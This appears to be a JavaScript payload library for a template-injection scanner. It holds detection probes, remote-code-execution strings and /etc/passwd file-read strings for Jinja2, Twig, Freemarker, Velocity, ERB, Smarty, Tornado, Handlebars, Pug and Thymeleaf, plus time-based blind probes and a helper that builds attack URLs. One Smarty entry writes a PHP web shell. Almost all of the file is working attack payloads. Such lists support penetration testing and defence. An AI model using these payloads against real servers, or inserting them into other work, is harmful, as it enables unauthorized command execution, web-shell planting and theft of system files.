// Server-Side Template Injection (SSTI) Payloads
// Comprehensive payload database for multiple template engines

const SSTIPayloads = {
    // Polyglot Detection Payloads
    polyglot: [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '${{7*7}}',
        '#{7*7}',
        '*{7*7}',
        '@(7*7)',
        '{7*7}'
    ],

    // Jinja2 (Python - Flask, Django)
    jinja2: {
        detection: [
            '{{7*7}}',
            '{{7*\'7\'}}',
            '{{config}}',
            '{{self}}',
            '{{request}}',
            '{{config.items()}}',
            '{{get_flashed_messages}}'
        ],
        rce: [
            '{{\'\'.__class__.__mro__[1].__subclasses__()}}',
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
            '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
            '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'id\').read()}}',
            '{{cycler.__init__.__globals__.os.popen(\'id\').read()}}',
            '{{joiner.__init__.__globals__.os.popen(\'id\').read()}}',
            '{{namespace.__init__.__globals__.os.popen(\'id\').read()}}'
        ],
        fileRead: [
            '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'/etc/passwd\').read()}}',
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'cat /etc/passwd\').read()}}',
            '{{get_flashed_messages.__globals__.__builtins__.open(\'/etc/passwd\').read()}}'
        ]
    },

    // Twig (PHP - Symfony)
    twig: {
        detection: [
            '{{7*7}}',
            '{{7*\'7\'}}',
            '{{dump(app)}}',
            '{{app}}',
            '{{_self}}',
            '{{_self.env}}'
        ],
        rce: [
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
            '{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("id")}}',
            '{{["id"]|filter("system")}}',
            '{{["id",0]|sort("system")}}',
            '{{["id"]|map("system")|join}}'
        ],
        fileRead: [
            '{{"/etc/passwd"|file_excerpt(1,30)}}',
            '{{app.request.files.get(1).__construct("/etc/passwd","")}}',
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /etc/passwd")}}'
        ]
    },

    // Freemarker (Java)
    freemarker: {
        detection: [
            '${7*7}',
            '#{7*7}',
            '${7*\'7\'}',
            '${.now}',
            '<#assign x=7*7>${x}'
        ],
        rce: [
            '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
            '<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder","id").start()}',
            '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/etc/passwd\').toURL().openStream().readAllBytes()?join(" ")}',
            '<#assign classloader=product.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}'
        ]
    },

    // Velocity (Java - Apache Velocity)
    velocity: {
        detection: [
            '$7*7',
            '${7*7}',
            '#set($x=7*7)$x',
            '$class',
            '$class.inspect("java.lang.Runtime")'
        ],
        rce: [
            '#set($x=\'\')#set($rt=$x.class.forName(\'java.lang.Runtime\'))#set($chr=$x.class.forName(\'java.lang.Character\'))#set($str=$x.class.forName(\'java.lang.String\'))#set($ex=$rt.getRuntime().exec(\'id\'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
            '#set($s=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").getInputStream())#foreach($i in [1..$s.available()])$i#end',
            '$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")'
        ]
    },

    // ERB (Ruby - Rails)
    erb: {
        detection: [
            '<%= 7*7 %>',
            '<%= 7*\'7\' %>',
            '<%= File.open(\'/etc/hostname\').read %>'
        ],
        rce: [
            '<%= system(\'id\') %>',
            '<%= `id` %>',
            '<%= IO.popen(\'id\').readlines() %>',
            '<%= %x|id| %>',
            '<%= exec(\'id\') %>'
        ],
        fileRead: [
            '<%= File.open(\'/etc/passwd\').read %>',
            '<%= IO.read(\'/etc/passwd\') %>',
            '<%= File.read(\'/etc/passwd\') %>'
        ]
    },

    // Smarty (PHP)
    smarty: {
        detection: [
            '{7*7}',
            '{$smarty.version}',
            '{php}echo 7*7;{/php}'
        ],
        rce: [
            '{php}echo `id`;{/php}',
            '{php}system(\'id\');{/php}',
            '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[\'cmd\']); ?>",self::clearConfig())}',
            '{function name=\'x\'}{php}echo `id`;{/php}{/function}{x}'
        ]
    },

    // Tornado (Python)
    tornado: {
        detection: [
            '{{7*7}}',
            '{{handler.settings}}',
            '{{handler.application.settings}}'
        ],
        rce: [
            '{% import os %}{{os.popen(\'id\').read()}}',
            '{% import subprocess %}{{subprocess.check_output(\'id\',shell=True)}}',
            '{{handler.settings[\'autoescape\'].__init__.__globals__[\'os\'].popen(\'id\').read()}}'
        ]
    },

    // Handlebars (Node.js)
    handlebars: {
        detection: [
            '{{7*7}}',
            '{{this}}',
            '{{constructor}}'
        ],
        rce: [
            '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').exec(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
        ]
    },

    // Pug/Jade (Node.js)
    pug: {
        detection: [
            '#{7*7}',
            '#{global}',
            '#{process}'
        ],
        rce: [
            '#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec(\'id\')}()}',
            '#{global.process.mainModule.require(\'child_process\').execSync(\'id\').toString()}'
        ]
    },

    // Thymeleaf (Java - Spring)
    thymeleaf: {
        detection: [
            '${7*7}',
            '[[${7*7}]]',
            '[(${7*7})]'
        ],
        rce: [
            '${T(java.lang.Runtime).getRuntime().exec(\'id\')}',
            '[[${T(java.lang.Runtime).getRuntime().exec(\'id\')}]]',
            '${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}'
        ]
    }
};

// Blind SSTI Detection (Time-based)
const BlindSSTIPayloads = {
    jinja2: [
        '{% for i in range(10000000) %}{% endfor %}',
        '{{range(10000000)|list}}'
    ],
    twig: [
        '{% for i in 0..10000000 %}{% endfor %}'
    ],
    freemarker: [
        '<#list 1..10000000 as i></#list>'
    ],
    velocity: [
        '#foreach($i in [1..10000000])#end'
    ]
};

// Helper functions
function getPayloadsByEngine(engine) {
    return SSTIPayloads[engine] || {};
}

function getAllDetectionPayloads() {
    const payloads = [...SSTIPayloads.polyglot];
    Object.keys(SSTIPayloads).forEach(engine => {
        if (engine !== 'polyglot' && SSTIPayloads[engine].detection) {
            payloads.push(...SSTIPayloads[engine].detection);
        }
    });
    return payloads;
}

function getAllRCEPayloads(engine) {
    if (SSTIPayloads[engine] && SSTIPayloads[engine].rce) {
        return SSTIPayloads[engine].rce;
    }
    return [];
}

function getPayloadCount() {
    let count = SSTIPayloads.polyglot.length;
    Object.keys(SSTIPayloads).forEach(engine => {
        if (engine !== 'polyglot') {
            const enginePayloads = SSTIPayloads[engine];
            Object.keys(enginePayloads).forEach(type => {
                if (Array.isArray(enginePayloads[type])) {
                    count += enginePayloads[type].length;
                }
            });
        }
    });
    return count;
}

function buildPayloadURL(baseUrl, paramName, payload, method = 'GET') {
    if (method === 'GET') {
        const url = new URL(baseUrl);
        url.searchParams.set(paramName, payload);
        return url.toString();
    } else {
        return `${baseUrl} (POST: ${paramName}=${payload})`;
    }
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        SSTIPayloads,
        BlindSSTIPayloads,
        getPayloadsByEngine,
        getAllDetectionPayloads,
        getAllRCEPayloads,
        getPayloadCount,
        buildPayloadURL
    };
}
